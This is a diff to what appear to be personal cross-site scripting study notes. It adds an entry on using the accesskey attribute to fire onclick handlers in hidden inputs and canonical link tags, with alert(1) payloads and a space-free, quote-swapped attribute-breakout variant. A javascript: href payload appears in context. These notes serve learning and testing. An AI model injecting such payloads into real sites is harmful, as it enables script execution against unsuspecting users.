@@ -79,6 +79,11 @@ To do...
 - Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context.
   - If the XSS context is into the href attribute of an anchor tag, you can use the javascript pseudo-protocol to execute script
   - `<a href="javascript:alert(document.domain)">`
-- accesskey
-  - <b>TO DO</b>
-
+- Access keys allow you to provide keyboard shortcuts that reference a specific element. This is useful in:
+  - Hidden inputs because events like onmouseover and onfocus can't be triggered due to the element being invisible
+    - `<input type="hidden" accesskey="X" onclick="alert(1)">`
+  - `<link rel="canonical" accesskey="X" onclick="alert(1)" />`
+- Suggestions:
+  - Substitute `'` `"` and viceversa
+  - Space is not needed
+    - `<link rel="canonical" href='https://website.net/?'accesskey='X'onclick='alert(1)'/>`
